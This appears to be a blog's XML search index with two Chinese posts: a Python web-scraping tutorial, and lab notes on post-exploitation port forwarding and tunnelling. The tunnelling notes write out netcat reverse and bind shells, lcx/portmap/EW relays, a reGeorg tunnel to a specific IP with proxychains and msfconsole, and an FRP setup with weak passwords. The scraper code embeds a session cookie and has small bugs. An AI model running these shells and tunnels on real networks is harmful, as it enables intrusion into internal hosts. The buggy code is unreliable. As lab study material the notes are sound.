<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>爬虫之快速入门</title>
      <link href="2021/01/25/%E7%88%AC%E8%99%AB%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
      <url>2021/01/25/%E7%88%AC%E8%99%AB%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="一：何为爬虫"><a href="#一：何为爬虫" class="headerlink" title="一：何为爬虫"></a>一：何为爬虫</h3><h4 id="1：什么是互联网？"><a href="#1：什么是互联网？" class="headerlink" title="1：什么是互联网？"></a>1：什么是互联网？</h4><blockquote><p>互联网是由网络设备（网线，路由器，交换机，防火墙等等）和多台计算机连接而成，像张网一样。</p></blockquote><h4 id="2：互联网建立的目的？"><a href="#2：互联网建立的目的？" class="headerlink" title="2：互联网建立的目的？"></a>2：互联网建立的目的？</h4><blockquote><p>互联网的核心价值在于数据的共享/传递：数据是存放于一台台计算机上的，而将计算机互联到一起的目的就是为了能够方便彼此之间的数据共享/传递，否则你只能拿U盘去别人的计算机上拷贝数据了。</p></blockquote><h4 id="3：什么是上网？爬虫要做的是什么？"><a href="#3：什么是上网？爬虫要做的是什么？" class="headerlink" title="3：什么是上网？爬虫要做的是什么？"></a>3：什么是上网？爬虫要做的是什么？</h4><blockquote><p>我们所谓的上网便是由用户端计算机发送请求给目标计算机，将目标计算机的数据下载到本地的过程。</p><ol><li>用户获取网络数据的方式是：浏览器提交请求-&gt;下载网页代码-&gt;解析/渲染成页面。</li><li>而爬虫程序要做的就是：模拟浏览器发送请求-&gt;下载网页代码-&gt;只提取有用的数据-&gt;存放于数据库或文件中</li><li>1与2区别是：我们的爬虫程序只提取网页代码中对我们有用的数据</li></ol></blockquote><h4 id="4：总结爬虫"><a href="#4：总结爬虫" class="headerlink" title="4：总结爬虫"></a>4：总结爬虫</h4><blockquote><ul><li>爬虫的比喻： 如果我们把互联网比作一张大的蜘蛛网，那一台计算机上的数据便是蜘蛛网上的一个猎物，而爬虫程序就是一只小蜘蛛，沿着蜘蛛网抓取自己想要的猎物/数据</li><li> 爬虫的定义：向网站发起请求，获取资源后分析并提取有用数据的程序 </li><li>爬虫的价值：互联网中最有价值的便是数据，比如天猫商城的商品信息，链家网的租房信息，雪球网的证券投资信息等等，这些数据都代表了各个行业的真金白银，可以说，谁掌握了行业内的第一手数据，谁就成了整个行业的主宰，如果把整个互联网的数据比喻为一座宝藏，那我们的爬虫课程就是来教大家如何来高效地挖掘这些宝藏，掌握了爬虫技能，你就成了所有互联网信息公司幕后的老板，换言之，它们都在免费为你提供有价值的数据。</li></ul></blockquote><h3 id="二：爬虫的基本流程"><a href="#二：爬虫的基本流程" class="headerlink" title="二：爬虫的基本流程"></a>二：爬虫的基本流程</h3><p><img src="https://images2017.cnblogs.com/blog/1036857/201711/1036857-20171102174025326-341248106.png"></p><ul><li><p>发起请求</p><blockquote><p>使用http库向目标站点发起请求，即发送一个Request<br>Request包含：请求头、请求体等</p></blockquote></li><li><p>获取响应内容</p><blockquote><p>如果服务器能正常响应，则会得到一个Response<br>Response包含：html，json，图片，视频等</p></blockquote></li><li><p>解析内容</p><blockquote><p>解析html数据：正则表达式，第三方解析库如Beautifulsoup，pyquery等<br>解析json数据：json模块<br>解析二进制数据:以b的方式写入文件</p></blockquote></li><li><p>保存数据</p><blockquote><p>数据库<br>XML文件</p></blockquote></li></ul><h3 id="三：请求与响应"><a href="#三：请求与响应" class="headerlink" title="三：请求与响应"></a>三：请求与响应</h3><p><img src="https://images2017.cnblogs.com/blog/1036857/201711/1036857-20171102180223529-1349691987.png"></p><ul><li>Request：用户将自己的信息通过浏览器（socket client）发送给服务器（socket server）</li><li>Response：服务器接收请求，分析用户发来的请求信息，然后返回数据</li><li>PS：浏览器在接收Response后，会解析其内容来显示给用户，而爬虫程序在模拟浏览器发送请求然后接收Response后，是要提取其中的有用数据。</li></ul><h3 id="四：Request"><a href="#四：Request" class="headerlink" title="四：Request"></a>四：Request</h3><blockquote><ol><li>请求方式：</li></ol><ul><li><p>常用的请求方式：GET，POST</p></li><li><p>其他请求方式：HEAD，PUT，DELETE，OPTHONS</p></li><li><p>ps：用浏览器演示get与post的区别，（用登录演示post）</p><p>post与get请求最终都会拼接成这种形式：k1=xxx&amp;k2=yyy&amp;k3=zzz<br>post请求的参数放在请求体内：可用浏览器查看，存放于form data内<br>get请求的参数直接放在url后</p></li></ul></blockquote><blockquote><ol start="2"><li>请求url：url全称统一资源定位符，如一个网页文档，一张图片 一个视频等都可以用url唯一来确定<ul><li>url编码<br><a href="https://www.baidu.com/s?wd=%E5%9B%BE%E7%89%87">https://www.baidu.com/s?wd=图片</a><br>图片会被编码（看示例代码）</li><li>网页的加载过程是：<br>加载一个网页，通常都是先加载document文档，<br>在解析document文档的时候，遇到链接，则针对超链接发起下载图片的请求</li></ul></li></ol></blockquote><blockquote><ol start="3"><li>请求头<ul><li>User-agent：请求头中如果没有user-agent客户端配置，<pre><code>服务端可能将你当做一个非法用户hostcookies：cookie用来保存登录信息</code></pre></li></ul></li></ol></blockquote><blockquote><p>一般做爬虫都会加上请求头</p></blockquote><blockquote><ol start="4"><li>请求体<ul><li>如果是get方式，请求体没有内容</li><li> 如果是post方式，请求体是format data</li></ul></li></ol></blockquote><blockquote><p>ps：<br>1、登录窗口，文件上传等，信息都会被附加到请求体内<br>2、登录，输入错误的用户名密码，然后提交，就可以看到post，正确登录后页面通常会跳转，无法捕捉到post</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;H_WISE_SIDS=101556_115474_115442_114743_108373_100099_115725_106201_107320_115339_114797_115553_116093_115546_115625_115446_114329_115350_114275_116040_110085; PSTM=1494300712; BAIDUID=42FE2934E37AF7AD1FA31D8CC7006D45:FG=1; BIDUPSID=2996557DB2710279BD865C50F9A68615; MCITY=-%3A; __cfduid=da9f97dea6458ca26aa4278280752ebb01508939712; BDSFRCVID=PGLsJeCCxG3wt_3ZUrBLDfv2D_qBZSjAgcEe3J; H_BDCLCKID_SF=tJAOoCLytI03qn5zq4Oh-4oHhxoJq5QxbT7Z0l8KtfcNVJQs-lCMhbtp-l3GJPoLWK6hBKQmWIQHDnbsbq0M2tcQXR5-WROCte74KKJx-4PWeIJo5tKh04JbhUJiB5OLBan7Lq7xfDDbbDtmej_3-PC3ql6354Rj2C_X3b7EfKjIOtO_bfbT2MbyeqrNQlTkLIvXoITJQD_bEP3Fbfj2DPQ3KabZqjDjJbue_I05f-oqebT4btbMqRtthf5KeJ3KaKrKW5rJabC3hPJeKU6qLT5Xjh6B5qDfyDoAbKOt-IOjhb5hMpnx-p0njxQyaR3RL2Kj0p_EWpcxsCQqLUonDh8L3H7MJUntKjnRonTO5hvvhb6O3M7-XpOhDG0fJjtJJbksQJ5e24oqHP-kKPrV-4oH5MQy5toyHD7yWCvjWlT5OR5Jj6KMjMkb3xbz2fcpMIrjob8M5CQESInv3MA--fcLD2ch5-3eQgTI3fbIJJjWsq0x0-jle-bQypoa-U0j2COMahkMal7xO-QO05CaD53yDNDqtjn-5TIX_CjJbnA_Hn7zepoxebtpbt-qJJjzMerW_Mc8QUJBH4tR-T3keh-83xbnBT5KaKO2-RnPXbcWjt_lWh_bLf_kQN3TbxuO5bRiL66I0h6jDn3oyT3VXp0n54nTqjDHfRuDVItXf-L_qtDk-PnVeUP3DhbZKxtqtDKjXJ7X2fclHJ7z-R3IBPCD0tjk-6JnWncKaRcI3poiqKtmjJb6XJkl2HQ405OT-6-O0KJcbRodobAwhPJvyT8DXnO7-fRTfJuJ_DDMJDD3fP36q4QV-JIehmT22jnT32JeaJ5n0-nnhP3mBTbA3JDYX-Oh-jjRX56GhfO_0R3jsJKRy66jK4JKjHKet6vP; ispeed_lsm=0; H_PS_PSSID=1421_24558_21120_17001_24880_22072; BD_UPN=123253; H_PS_645EC=44be6I1wqYYVvyugm2gc3PK9PoSa26pxhzOVbeQrn2rRadHvKoI%2BCbN5K%2Bg; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;www.baidu.com&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># response=requests.get(&#x27;https://www.baidu.com/s?&#x27;+urlencode(&#123;&#x27;wd&#x27;:&#x27;美女&#x27;&#125;),headers=headers)</span></span><br><span class="line">response=requests.get(<span class="string">&#x27;https://www.baidu.com/s&#x27;</span>,params=&#123;<span class="string">&#x27;wd&#x27;</span>:<span class="string">&#x27;美女&#x27;</span>&#125;,headers=headers) <span class="comment">#params内部就是调用urlencode</span></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h3 id="五：Response"><a href="#五：Response" class="headerlink" title="五：Response"></a>五：Response</h3><ul><li><p>响应状态</p><pre><code>200：代表成功301：代表跳转404：文件不存在403：权限502：服务器错误</code></pre></li><li><p>Respone header</p><pre><code>set-cookie：可能有多个，是来告诉浏览器，把cookie保存下来</code></pre></li><li><p>preview就是网页源代码</p><pre><code>最主要的部分，包含了请求资源的内容如网页html，图片二进制数据等</code></pre></li></ul><h3 id="六：实战"><a href="#六：实战" class="headerlink" title="六：实战"></a>六：实战</h3><ul><li><p>总结爬虫流程：</p><pre><code>爬取---&gt;解析---&gt;存储</code></pre></li><li><p>爬虫所需工具：</p><pre><code>请求库：requests,selenium解析库：正则，beautifulsoup，pyquery存储库：文件，MySQL，Mongodb，Redis</code></pre></li><li><p>爬虫常用框架：</p><pre><code>scrapy</code></pre></li></ul><h4 id="爬取校花网视频"><a href="#爬取校花网视频" class="headerlink" title="爬取校花网视频"></a>爬取校花网视频</h4><ol><li><p>基础版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">respose=requests.get(<span class="string">&#x27;http://www.xiaohuar.com/v/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(respose.status_code)# 响应的状态码</span></span><br><span class="line"><span class="comment"># print(respose.content)  #返回字节信息</span></span><br><span class="line"><span class="comment"># print(respose.text)  #返回文本内容</span></span><br><span class="line">urls=re.findall(<span class="string">r&#x27;class=&quot;items&quot;.*?href=&quot;(.*?)&quot;&#x27;</span>,respose.text,re.S)  <span class="comment">#re.S 把文本信息转换成1行匹配</span></span><br><span class="line">url=urls[<span class="number">5</span>]</span><br><span class="line">result=requests.get(url)</span><br><span class="line">mp4_url=re.findall(<span class="string">r&#x27;id=&quot;media&quot;.*?src=&quot;(.*?)&quot;&#x27;</span>,result.text,re.S)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">video=requests.get(mp4_url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\a.mp4&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(video.content)</span><br></pre></td></tr></table></figure></li><li><p>函数封装版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">url</span>):</span></span><br><span class="line">    respose = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> respose.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> respose.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_index</span>(<span class="params">res</span>):</span></span><br><span class="line">    urls = re.findall(<span class="string">r&#x27;class=&quot;items&quot;.*?href=&quot;(.*?)&quot;&#x27;</span>, res,re.S)  <span class="comment"># re.S 把文本信息转换成1行匹配</span></span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_detail</span>(<span class="params">urls</span>):</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            url=<span class="string">&#x27;http://www.xiaohuar.com%s&#x27;</span> %url</span><br><span class="line">        result = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> result.status_code==<span class="number">200</span> :</span><br><span class="line">            mp4_url_list = re.findall(<span class="string">r&#x27;id=&quot;media&quot;.*?src=&quot;(.*?)&quot;&#x27;</span>, result.text, re.S)</span><br><span class="line">            <span class="keyword">if</span> mp4_url_list:</span><br><span class="line">                mp4_url=mp4_url_list[<span class="number">0</span>]</span><br><span class="line">                print(mp4_url)</span><br><span class="line">                <span class="comment"># save(mp4_url)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">url</span>):</span></span><br><span class="line">    video = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> video.status_code==<span class="number">200</span>:</span><br><span class="line">        m=hashlib.md5()</span><br><span class="line">        m.updata(url.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        m.updata(<span class="built_in">str</span>(time.time()).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        filename=<span class="string">r&#x27;%s.mp4&#x27;</span>% m.hexdigest()</span><br><span class="line">        filepath=<span class="string">r&#x27;D:\\%s&#x27;</span>%filename</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(video.content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res1 = get_index(<span class="string">&#x27;http://www.xiaohuar.com/list-3-%s.html&#x27;</span>% i )</span><br><span class="line">        res2 = parse_index(res1)</span><br><span class="line">        get_detail(res2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li><li><p>并发版（PS：如果一共需要爬30个视频，开30个线程去做，花的时间就是 其中最慢那份的耗时时间）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line">p=ThreadPoolExecutor(<span class="number">30</span>) <span class="comment">#创建1个程池中，容纳线程个数为30个；</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">url</span>):</span></span><br><span class="line">    respose = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> respose.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> respose.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_index</span>(<span class="params">res</span>):</span></span><br><span class="line">    res=res.result() <span class="comment">#进程执行完毕后，得到1个对象</span></span><br><span class="line">    urls = re.findall(<span class="string">r&#x27;class=&quot;items&quot;.*?href=&quot;(.*?)&quot;&#x27;</span>, res,re.S)  <span class="comment"># re.S 把文本信息转换成1行匹配</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        p.submit(get_detail(url))  <span class="comment">#获取详情页 提交到线程池</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_detail</span>(<span class="params">url</span>):</span>  <span class="comment">#只下载1个视频</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            url=<span class="string">&#x27;http://www.xiaohuar.com%s&#x27;</span> %url</span><br><span class="line">        result = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> result.status_code==<span class="number">200</span> :</span><br><span class="line">            mp4_url_list = re.findall(<span class="string">r&#x27;id=&quot;media&quot;.*?src=&quot;(.*?)&quot;&#x27;</span>, result.text, re.S)</span><br><span class="line">            <span class="keyword">if</span> mp4_url_list:</span><br><span class="line">                mp4_url=mp4_url_list[<span class="number">0</span>]</span><br><span class="line">                print(mp4_url)</span><br><span class="line">                <span class="comment"># save(mp4_url)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">url</span>):</span></span><br><span class="line">    video = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> video.status_code==<span class="number">200</span>:</span><br><span class="line">        m=hashlib.md5()</span><br><span class="line">        m.updata(url.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        m.updata(<span class="built_in">str</span>(time.time()).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        filename=<span class="string">r&#x27;%s.mp4&#x27;</span>% m.hexdigest()</span><br><span class="line">        filepath=<span class="string">r&#x27;D:\\%s&#x27;</span>%filename</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(video.content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        p.submit(get_index,<span class="string">&#x27;http://www.xiaohuar.com/list-3-%s.html&#x27;</span>% i ).add_done_callback(parse_index)</span><br><span class="line">        <span class="comment">#1、先把爬主页的任务（get_index）异步提交到线程池</span></span><br><span class="line">        <span class="comment">#2、get_index任务执行完后，会通过回调函add_done_callback（）数通知主线程，任务完成；</span></span><br><span class="line">        <span class="comment">#2、把get_index执行结果（注意线程执行结果是对象，调用res=res.result()方法，才能获取真正执行结果），当做参数传给parse_index</span></span><br><span class="line">        <span class="comment">#3、parse_index任务执行完毕后，</span></span><br><span class="line">        <span class="comment">#4、通过循环，再次把获取详情页 get_detail（）任务提交到线程池执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h5 id="涉及知识："><a href="#涉及知识：" class="headerlink" title="涉及知识："></a>涉及知识：</h5><blockquote><p>计算密集型任务：使用多进程，因为能Python有GIL，多进程可以利用上CPU多核优势；</p><p>IO密集型任务：使用多线程，做IO切换节省任务执行时间（并发）</p><p>线程池</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>端口转发与隧道</title>
      <link href="2021/01/21/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/"/>
      <url>2021/01/21/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/</url>
      
        <content type="html"><![CDATA[<h3 id="实验1：LCX端口转发"><a href="#实验1：LCX端口转发" class="headerlink" title="实验1：LCX端口转发"></a>实验1：LCX端口转发</h3><ul><li>正向转发</li></ul><blockquote><p>内网主机执行：lcx.exe –slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p></blockquote><blockquote><p>外网主机执行：Lcx.exe –listen 公网主机端口1 公网主机端口2</p></blockquote><ul><li>反向转发</li></ul><blockquote><p>外网主机执行：Lcx.exe -tran 53 目标主机IP 3389</p></blockquote><h3 id="试验二：PORTMAP端口转发"><a href="#试验二：PORTMAP端口转发" class="headerlink" title="试验二：PORTMAP端口转发"></a>试验二：PORTMAP端口转发</h3><ul><li>正向转发</li></ul><blockquote><p>内网主机执行：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666</p><p>外网主机执行：./portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777</p></blockquote><ul><li>反向转发</li></ul><blockquote><p>外网主机执行：./portmap -m1 -p1 6666 -h2 目标主机IP -p2 22</p></blockquote><h3 id="实验三：NC反弹"><a href="#实验三：NC反弹" class="headerlink" title="实验三：NC反弹"></a>实验三：NC反弹</h3><ul><li>反向连接</li></ul><blockquote><p>在公网主机进行监听：nc -lvp 4444</p><p>在内网主机执行：nc -t -e cmd.exe 公网主机IP 4444</p></blockquote><ul><li>正向连接</li></ul><blockquote><p>远程主机执行：nc -l -p 4444 -t -e cmd.exe</p><p>攻击主机执行：nc -vv 远程主机IP 4444</p></blockquote><h3 id="实验四：EW工具使用"><a href="#实验四：EW工具使用" class="headerlink" title="实验四：EW工具使用"></a>实验四：EW工具使用</h3><ul><li><p>端口转发</p></li><li><ul><li><p>反向转发</p><blockquote><p>./ew_for_Linux64 -s lcx_tran -l 1080 -f 内网主机IP -g 3389</p></blockquote></li><li><p>正向转发</p><blockquote><p>公网执行：ew -s lcx_listen -l 1080 -e 8080<br>内网执行：ew -s lcx_slave -d 192.168.0.31 -e 8080 -f 192.168.5.101 -g 22</p></blockquote></li></ul></li><li><p>流量转发</p></li><li><ul><li><p>正向代理</p><blockquote><p>ew -s ssocksd -l 8888      开启 8888端口的socks 代理</p></blockquote></li><li><p>反向代理</p><blockquote><p>1.在公网服务器上执行以下命令:<br>ew -s rcsocks -l 1080 -e 1024       监听本机的1080端口转发到反连1024端口的主机<br>2在目标机器执行以下命令:<br>ew -s rssocks -d 公网IP -e 1024             通过socks隧道连接公网IP的1024端口</p></blockquote></li></ul></li></ul><h3 id="实验五：reGeorg-Proxychains"><a href="#实验五：reGeorg-Proxychains" class="headerlink" title="实验五：reGeorg+Proxychains"></a>实验五：reGeorg+Proxychains</h3><h4 id="步骤一：服务器操作"><a href="#步骤一：服务器操作" class="headerlink" title="步骤一：服务器操作"></a>步骤一：服务器操作</h4><blockquote><p>yum -y install httpd php</p><p>Tunnel.nosockets.php—&gt;/var/www/html</p></blockquote><h4 id="步骤二：客户端操作"><a href="#步骤二：客户端操作" class="headerlink" title="步骤二：客户端操作"></a>步骤二：客户端操作</h4><blockquote><p><a href="http://81.70.149.131/tunnelnos.php">http://81.70.149.131/tunnelnos.php</a></p><p>回显内容：Georg says, ‘All seems fine’</p></blockquote><blockquote><p>python2 reGeorgSocksProxy.py -p 8080 -u  <a href="http://81.70.149.131/tunnelnos.php">http://81.70.149.131/tunnelnos.php</a></p></blockquote><h4 id="步骤三：Proxychains配置"><a href="#步骤三：Proxychains配置" class="headerlink" title="步骤三：Proxychains配置"></a>步骤三：Proxychains配置</h4><blockquote><p>vi /etc/proxychains4.conf</p><p>52 #proxy_dns</p><p>115 socks5 127.0.0.1 8080</p></blockquote><h4 id="步骤四：验证配置"><a href="#步骤四：验证配置" class="headerlink" title="步骤四：验证配置"></a>步骤四：验证配置</h4><blockquote><p>proxychains curl <a href="http://10.0.8.12/">http://10.0.8.12/</a></p><p>proxychains msfconsole</p></blockquote><h3 id="实验六：FRP内网穿透"><a href="#实验六：FRP内网穿透" class="headerlink" title="实验六：FRP内网穿透"></a>实验六：FRP内网穿透</h3><h4 id="步骤一：公网主机配置"><a href="#步骤一：公网主机配置" class="headerlink" title="步骤一：公网主机配置"></a>步骤一：公网主机配置</h4><blockquote><p>#frps.ini文件内容配置如下</p><p>[common]<br>bind_addr=0.0.0.0<br>bind_port = 7000</p><p>authenticate_heartbeats = true<br>authenticate_new_work_conns = true<br>authentication_method = token<br>token = ‘123456’</p><p>dashboard_port = 7500<br>dashboard_user = admin<br>dashboard_pwd = admin888</p></blockquote><blockquote><p>./frps -c frps.ini          #启动服务端</p><p>http://公网IP:7500/   #登录WEB控制端</p></blockquote><h4 id="步骤二：内网主机配置"><a href="#步骤二：内网主机配置" class="headerlink" title="步骤二：内网主机配置"></a>步骤二：内网主机配置</h4><blockquote><p>#frpc.ini文件内容如下</p><p>[common]<br>server_addr = 1.1.1.1<br>server_port = 7000<br>authenticate_heartbeats = true<br>authenticate_new_work_conns = true<br>authentication_method = token<br>token = ‘123456’</p><p>[rdp]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 3389<br>remote_port = 6000</p></blockquote><blockquote><p>frpc.exe -c frpc.ini   #客户端与服务端建立连接</p></blockquote><h4 id="步骤三：配置验证"><a href="#步骤三：配置验证" class="headerlink" title="步骤三：配置验证"></a>步骤三：配置验证</h4><blockquote><p>mstsc 1.1.1.1:6000   #进行内网主机RDP登录</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试简介</title>
      <link href="2021/01/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/"/>
      <url>2021/01/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/</url>
      
